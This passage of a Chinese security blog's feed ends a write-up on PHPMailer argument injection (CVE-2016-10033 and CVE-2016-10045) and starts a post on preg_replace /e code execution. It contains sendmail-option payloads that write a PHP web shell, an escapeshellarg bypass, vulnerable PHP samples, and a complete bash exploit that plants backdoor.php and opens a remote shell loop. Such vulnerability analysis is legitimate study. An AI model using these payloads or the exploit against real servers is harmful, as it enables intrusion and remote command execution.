class="keyword">$this</span>-&gt;MIMEBody);</span><br><span class="line">               <span class="keyword">case</span> <span class="string">'smtp'</span>:</span><br><span class="line">                   <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;smtpSend(<span class="keyword">$this</span>-&gt;MIMEHeader, <span class="keyword">$this</span>-&gt;MIMEBody);</span><br><span class="line">               <span class="keyword">case</span> <span class="string">'mail'</span>:</span><br><span class="line">                   <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;mailSend(<span class="keyword">$this</span>-&gt;MIMEHeader, <span class="keyword">$this</span>-&gt;MIMEBody);</span><br><span class="line">               <span class="keyword">default</span>:</span><br><span class="line">                   $sendMethod = <span class="keyword">$this</span>-&gt;Mailer.<span class="string">'Send'</span>;</span><br><span class="line">                   <span class="keyword">if</span> (method_exists(<span class="keyword">$this</span>, $sendMethod)) &#123;</span><br><span class="line">                       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;$sendMethod(<span class="keyword">$this</span>-&gt;MIMEHeader, <span class="keyword">$this</span>-&gt;MIMEBody);</span><br><span class="line">                   &#125;</span><br><span class="line">                   <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;mailSend(<span class="keyword">$this</span>-&gt;MIMEHeader, <span class="keyword">$this</span>-&gt;MIMEBody);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (phpmailerException $exc) &#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;setError($exc-&gt;getMessage());</span><br><span class="line">           <span class="keyword">$this</span>-&gt;edebug($exc-&gt;getMessage());</span><br><span class="line">           <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;exceptions) &#123;</span><br><span class="line">               <span class="keyword">throw</span> $exc;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>跟进mailSend()看看，关注到\$params，它是由\$this-&gt;Sender的值直接拼接而成的，最后传入mailPassthru()函数的第五个参数进行调用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">mailSend</span><span class="params">($header, $body)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $toArr = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;to <span class="keyword">as</span> $toaddr) &#123;</span><br><span class="line">        $toArr[] = <span class="keyword">$this</span>-&gt;addrFormat($toaddr);</span><br><span class="line">    &#125;</span><br><span class="line">    $to = implode(<span class="string">', '</span>, $toArr);</span><br><span class="line">    $params = <span class="keyword">null</span>;</span><br><span class="line">    <span class="comment">//This sets the SMTP envelope sender which gets turned into a return-path header by the receiver</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;Sender)) &#123;</span><br><span class="line">        $params = sprintf(<span class="string">'-f%s'</span>, <span class="keyword">$this</span>-&gt;Sender);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;Sender != <span class="string">''</span> <span class="keyword">and</span> !ini_get(<span class="string">'safe_mode'</span>)) &#123;</span><br><span class="line">        $old_from = ini_get(<span class="string">'sendmail_from'</span>);</span><br><span class="line">        ini_set(<span class="string">'sendmail_from'</span>, <span class="keyword">$this</span>-&gt;Sender);</span><br><span class="line">    &#125;</span><br><span class="line">    $result = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;SingleTo <span class="keyword">and</span> count($toArr) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($toArr <span class="keyword">as</span> $toAddr) &#123;</span><br><span class="line">            $result = <span class="keyword">$this</span>-&gt;mailPassthru($toAddr, <span class="keyword">$this</span>-&gt;Subject, $body, $header, $params);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;doCallback($result, <span class="keyword">array</span>($toAddr), <span class="keyword">$this</span>-&gt;cc, <span class="keyword">$this</span>-&gt;bcc, <span class="keyword">$this</span>-&gt;Subject, $body, <span class="keyword">$this</span>-&gt;From);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $result = <span class="keyword">$this</span>-&gt;mailPassthru($to, <span class="keyword">$this</span>-&gt;Subject, $body, $header, $params);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;doCallback($result, <span class="keyword">$this</span>-&gt;to, <span class="keyword">$this</span>-&gt;cc, <span class="keyword">$this</span>-&gt;bcc, <span class="keyword">$this</span>-&gt;Subject, $body, <span class="keyword">$this</span>-&gt;From);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($old_from)) &#123;</span><br><span class="line">        ini_set(<span class="string">'sendmail_from'</span>, $old_from);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!$result) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> phpmailerException(<span class="keyword">$this</span>-&gt;lang(<span class="string">'instantiate'</span>), <span class="keyword">self</span>::STOP_CRITICAL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再跟进mailPassthru()函数看下，注意看第五个参数即\$params的调用过程，当safe_mode安全模式未开启、\$params不为空、\$this-&gt;UseSendmailOptions不为空时就将\$params作为第五个参数传入mail()函数中调用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Whether mail() uses a fully sendmail-compatible MTA.</span></span><br><span class="line"><span class="comment">    * One which supports sendmail's "-oi -f" options.</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@var</span> boolean</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">public</span> $UseSendmailOptions = <span class="keyword">true</span>;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">mailPassthru</span><span class="params">($to, $subject, $body, $header, $params)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="comment">//Check overloading of mail function to avoid double-encoding</span></span><br><span class="line">       <span class="keyword">if</span> (ini_get(<span class="string">'mbstring.func_overload'</span>) &amp; <span class="number">1</span>) &#123;</span><br><span class="line">           $subject = <span class="keyword">$this</span>-&gt;secureHeader($subject);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           $subject = <span class="keyword">$this</span>-&gt;encodeHeader(<span class="keyword">$this</span>-&gt;secureHeader($subject));</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">//Can't use additional_parameters in safe_mode</span></span><br><span class="line">       <span class="comment">//@link http://php.net/manual/en/function.mail.php</span></span><br><span class="line">       <span class="keyword">if</span> (ini_get(<span class="string">'safe_mode'</span>) <span class="keyword">or</span> !<span class="keyword">$this</span>-&gt;UseSendmailOptions <span class="keyword">or</span> is_null($params)) &#123;</span><br><span class="line">           $result = @mail($to, $subject, $body, $header);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           $result = @mail($to, $subject, $body, $header, $params);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> $result;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>这里\$this-&gt;UseSendmailOptions默认初始值为true，且未经过其他赋值操作，因此只要安全模式不开启且\$params不为空即可进入<code>@mail($to, $subject, $body, $header, $params);</code>的逻辑。</p><p>至此，整个调用链我们都分析清楚了。由前面第一节的分析知道，mail()函数的第五个参数可以向sendmail程序添加额外参数来写shell，而这里第五个参数为\$params，其调用链为：index.php的email表单项–&gt;\$email–&gt;\$address–&gt;\$this-&gt;Sender–&gt;\$params。</p><h4 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h4><p>因此，我们在email表现进行类似第一小节的参数注入即可写入shell。在email表项填<code>a( -OQueueDirectory=/tmp -X/www/log-shell.php )@a.com</code>，在name表项或message表项中填入恶意PHP代码都可：</p><p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/17.png" alt=""></p><p>等待sendmail程序响应一段时间后，访问log-shell.php即可触发恶意PHP代码：</p><p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/18.png" alt=""></p><p>查看日志，确实写入了恶意PHP代码：</p><p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/19.png" alt=""></p><p>当然，有exp脚本直接用就可以了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># CVE-2016-10033 exploit by opsxcq</span></span><br><span class="line"><span class="comment"># https://github.com/opsxcq/exploit-CVE-2016-10033</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'[+] CVE-2016-10033 exploit by opsxcq'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">"<span class="variable">$1</span>"</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'[-] Please inform an host as parameter'</span></span><br><span class="line">    <span class="built_in">exit</span> -1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ $(uname) == <span class="string">'Darwin'</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    decoder=<span class="string">'base64 -D'</span></span><br><span class="line"><span class="keyword">elif</span> [ $(uname) == <span class="string">'Linux'</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    decoder=<span class="string">'base64 -d'</span>  </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'[-] Your platform isnt supported: '</span>$(uname)</span><br><span class="line">    <span class="built_in">exit</span> -1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">host=<span class="variable">$1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'[+] Exploiting '</span><span class="variable">$host</span></span><br><span class="line"></span><br><span class="line">curl -sq <span class="string">'http://'</span><span class="variable">$host</span> -H <span class="string">'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzXJpHSq4mNy35tHe'</span> --data-binary $<span class="string">'------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="action"\r\n\r\nsubmit\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="name"\r\n\r\n&lt;?php echo "|".base64_encode(system(base64_decode($_GET["cmd"])))."|"; ?&gt;\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="email"\r\n\r\n\"vulnerables\\\" -OQueueDirectory=/tmp -X/www/backdoor.php server\" @test.com\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="message"\r\n\r\nPwned\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe--\r\n'</span> &gt;/dev/null &amp;&amp; <span class="built_in">echo</span> <span class="string">'[+] Target exploited, acessing shell at http://'</span><span class="variable">$host</span><span class="string">'/backdoor.php'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'[+] Checking if the backdoor was created on target system'</span></span><br><span class="line">code=$(curl -o /dev/null --silent --head --write-out <span class="string">'%&#123;http_code&#125;\n'</span> <span class="string">"http://<span class="variable">$host</span>/backdoor.php"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$code</span>"</span> != <span class="string">"200"</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'[-] Target cant be exploited'</span></span><br><span class="line">    <span class="built_in">exit</span> -1</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'[+] Backdoor.php found on remote system'</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">cmd=<span class="string">'whoami'</span></span><br><span class="line"><span class="keyword">while</span> [ <span class="string">"<span class="variable">$cmd</span>"</span> != <span class="string">'exit'</span> ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'[+] Running '</span><span class="variable">$cmd</span></span><br><span class="line">    <span class="keyword">if</span> ! curl -sq http://<span class="variable">$host</span>/backdoor.php?cmd=$(<span class="built_in">echo</span> -ne <span class="variable">$cmd</span> | base64) | grep <span class="string">'|'</span> | grep -v <span class="string">'base64_encode'</span> | head -n 1 | cut -d <span class="string">'|'</span> -f 2 | <span class="variable">$decoder</span> </span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'[-] Connection problens'</span></span><br><span class="line">        <span class="built_in">exit</span> -1</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line">    <span class="built_in">read</span> -p <span class="string">'RemoteShell&gt; '</span> cmd</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'[+] Exiting'</span></span><br></pre></td></tr></table></figure><h3 id="CVE-2016-10045"><a href="#CVE-2016-10045" class="headerlink" title="CVE-2016-10045"></a>CVE-2016-10045</h3><p>环境：<a href="https://github.com/pedro823/cve-2016-10033-45/tree/master/5.2.18" target="_blank" rel="noopener">https://github.com/pedro823/cve-2016-10033-45/tree/master/5.2.18</a></p><p>前提条件：</p><ul><li>php版本 &lt; 5.2.0；</li><li>phpmailer版本 = 5.2.18；</li><li>php未安装pcre；</li><li>安全模式未开启即safe_mode = false（default）；</li></ul><p>界面和功能跟前面的一致：</p><p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/22.png" alt=""></p><h4 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h4><p>和前面一样跟着调用链逐个分析函数，可明显看到官方对mailSend()函数进行了修改：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">mailSend</span><span class="params">($header, $body)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $toArr = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;to <span class="keyword">as</span> $toaddr) &#123;</span><br><span class="line">        $toArr[] = <span class="keyword">$this</span>-&gt;addrFormat($toaddr);</span><br><span class="line">    &#125;</span><br><span class="line">    $to = implode(<span class="string">', '</span>, $toArr);</span><br><span class="line">    $params = <span class="keyword">null</span>;</span><br><span class="line">    <span class="comment">//This sets the SMTP envelope sender which gets turned into a return-path header by the receiver</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;Sender) <span class="keyword">and</span> <span class="keyword">$this</span>-&gt;validateAddress(<span class="keyword">$this</span>-&gt;Sender)) &#123;</span><br><span class="line">        $params = sprintf(<span class="string">'-f%s'</span>, escapeshellarg(<span class="keyword">$this</span>-&gt;Sender));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;Sender) <span class="keyword">and</span> !ini_get(<span class="string">'safe_mode'</span>) <span class="keyword">and</span> <span class="keyword">$this</span>-&gt;validateAddress(<span class="keyword">$this</span>-&gt;Sender)) &#123;</span><br><span class="line">        $old_from = ini_get(<span class="string">'sendmail_from'</span>);</span><br><span class="line">        ini_set(<span class="string">'sendmail_from'</span>, <span class="keyword">$this</span>-&gt;Sender);</span><br><span class="line">    &#125;</span><br><span class="line">    $result = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;SingleTo <span class="keyword">and</span> count($toArr) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($toArr <span class="keyword">as</span> $toAddr) &#123;</span><br><span class="line">            $result = <span class="keyword">$this</span>-&gt;mailPassthru($toAddr, <span class="keyword">$this</span>-&gt;Subject, $body, $header, $params);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;doCallback($result, <span class="keyword">array</span>($toAddr), <span class="keyword">$this</span>-&gt;cc, <span class="keyword">$this</span>-&gt;bcc, <span class="keyword">$this</span>-&gt;Subject, $body, <span class="keyword">$this</span>-&gt;From);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $result = <span class="keyword">$this</span>-&gt;mailPassthru($to, <span class="keyword">$this</span>-&gt;Subject, $body, $header, $params);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;doCallback($result, <span class="keyword">$this</span>-&gt;to, <span class="keyword">$this</span>-&gt;cc, <span class="keyword">$this</span>-&gt;bcc, <span class="keyword">$this</span>-&gt;Subject, $body, <span class="keyword">$this</span>-&gt;From);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($old_from)) &#123;</span><br><span class="line">        ini_set(<span class="string">'sendmail_from'</span>, $old_from);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!$result) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> phpmailerException(<span class="keyword">$this</span>-&gt;lang(<span class="string">'instantiate'</span>), <span class="keyword">self</span>::STOP_CRITICAL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>做的修改主要是调用validateAddress()函数对\$this-&gt;Sender进行过滤，在将\$this-&gt;Sender拼接赋值给\$params之前调用escapeshellarg()进行过滤。</p><p>这里借个seebug的图对比会更清晰地看出官方修改的地方：</p><p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/20.png" alt=""></p><p>在之前的CVE-2016-10033中的payload<code>a( -OQueueDirectory=/tmp -X/www/log-shell.php )@a.com</code>已经用不了了，因为调用了escapeshellarg()进行过滤，但是在其中添加单引号即可Bypass，payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos;( -OQueueDirectory=/tmp -X/www/log-shell.php )@a.com</span><br></pre></td></tr></table></figure><p>为什么添加个单引号就可以Bypass escapeshellarg()的过滤呢？——这里可以参考前面第二节说的escapeshellarg&gt;escapeshellcmd参数注入即可。</p><p>这里我们看下mail()函数的源码，可以看到传入的额外参数是会经过escapeshellcmd()函数过滤的，也就是说满足了前面escapeshellarg&gt;escapeshellcmd参数注入的前提条件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (force_extra_parameters) &#123;</span><br><span class="line">    extra_cmd = php_escape_shell_cmd(force_extra_parameters);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (extra_cmd) &#123;</span><br><span class="line">    extra_cmd = php_escape_shell_cmd(extra_cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (php_mail(to_r, subject_r, message, headers_trimmed, extra_cmd TSRMLS_CC)) &#123;</span><br><span class="line">    RETVAL_TRUE;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    RETVAL_FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="攻击利用-1"><a href="#攻击利用-1" class="headerlink" title="攻击利用"></a>攻击利用</h4><p>在email表项处输入payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos;( -OQueueDirectory=/tmp -X/www/log-shell.php )@a.com</span><br></pre></td></tr></table></figure><p>在其他项随意一栏输入恶意PHP代码即可。如下：</p><p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/21.png" alt=""></p><p>等一会即可访问后门日志文件：</p><p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/23.png" alt=""></p><p>后台查看：</p><p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/24.png" alt=""></p><h2 id="0x04-题目"><a href="#0x04-题目" class="headerlink" title="0x04 题目"></a>0x04 题目</h2><p>…</p><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html" target="_blank" rel="noopener">谈escapeshellarg绕过与参数注入漏洞</a></p><p><a href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98" target="_blank" rel="noopener">谈谈escapeshellarg参数绕过和注入的问题</a></p><p><a href="https://www.anquanke.com/post/id/107336" target="_blank" rel="noopener">利用/绕过 PHP escapeshellarg/escapeshellcmd函数</a></p><p><a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">PHP escapeshellarg()+escapeshellcmd() 之殇</a></p>]]></content>
    
    <summary type="html">
    
      未完待续...
    
    </summary>
    
      <category term="PHP" scheme="https://Mi1k7ea.github.com/categories/PHP/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="PHP" scheme="https://Mi1k7ea.github.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>浅析preg_replace与preg_match</title>
    <link href="https://Mi1k7ea.github.com/2019/07/02/%E6%B5%85%E6%9E%90preg-replace%E4%B8%8Epreg-match/"/>
    <id>https://Mi1k7ea.github.com/2019/07/02/浅析preg-replace与preg-match/</id>
    <published>2019-07-02T13:53:14.000Z</published>
    <updated>2019-07-04T14:52:29.265Z</updated>
    
    <content type="html"><![CDATA[<p>这里记录下preg_replace()和preg_match()的一些小坑。</p><h2 id="0x01-preg-replace"><a href="#0x01-preg-replace" class="headerlink" title="0x01 preg_replace()"></a>0x01 preg_replace()</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>preg_replace()函数执行一个正则表达式的搜索和替换。</p><p><strong>函数定义</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</span><br></pre></td></tr></table></figure><p>搜索subject中匹配pattern的部分，以replacement进行替换。</p><p><strong>参数说明</strong></p><ul><li>$pattern: 要搜索的模式，可以是字符串或一个字符串数组。</li><li>$replacement: 用于替换的字符串或字符串数组。</li><li>$subject: 要搜索替换的目标字符串或字符串数组。</li><li>$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。</li><li>$count: 可选，为替换执行的次数。</li></ul><p><strong>返回值</strong></p><p>如果 subject 是一个数组， preg_replace() 返回一个数组， 其他情况下返回一个字符串。</p><p>如果匹配被查找到，替换后的 subject 被返回，其他情况下 返回没有改变的 subject。如果发生错误，返回 NULL。</p><h3 id="PHP代码执行"><a href="#PHP代码执行" class="headerlink" title="PHP代码执行"></a>PHP代码执行</h3><p>如果在构造正则表达式即pattern参数的时候使用了/e修正符，这时preg_replace()函数就会将replacement参数当作PHP代码执行。</p><p>preg_replace()函数实现的PHP代码执行分为三种模式，分别是只可控pattern、replacement、subject这三个参数中其中的一个。</p><h4 id="模式一——pattern参数可控"><a href="#模式一——pattern参数可控" class="headerlink" title="模式一——pattern参数可控"></a>模式一——pattern参数可控</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> $re = $_GET[<span class="string">'re'</span>];</span><br><span class="line">$var = <span class="string">'&lt;h1&gt;phpinfo()&lt;/h1&gt;'</span>;</span><br><span class="line">preg_replace(<span class="string">"/&lt;h1&gt;(.*?)$re"</span>, <span class="string">'\\1'</span>, $var);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2019/07/02/浅析preg-replace与preg-match/1.png" alt=""></p><h4 id="模式二——replacement参数可控"><a href="#模式二——replacement参数可控" class="headerlink" title="模式二——replacement参数可控"></a>模式二——replacement参数可控</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">preg_replace(<span class="string">"/com/e"</span>,$_GET[<span class="string">'re'</span>],<span class="string">"www.baidu.com"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2019/07/02/浅析preg-replace与preg-match/2.png" alt=""></p><h4 id="模式三——subject参数可控"><a href="#模式三——subject参数可控" class="headerlink" title="模式三——subject参数可控"></a>模式三——subject参数可控</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">preg_replace(<span class="string">"/\s*\[php\](.*?)\[\/php\]\s*/ies"</span>, <span class="string">"\\1"</span>, $_GET[<span class="string">'re'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2019/07/02/浅析preg-replace与preg-match/3.png" alt=""></p><p>这里有个小坑，尝试执行echo ‘mi1k7ea’代码，发现会报错，单引号前被添加转义符转义了：</p><p><img 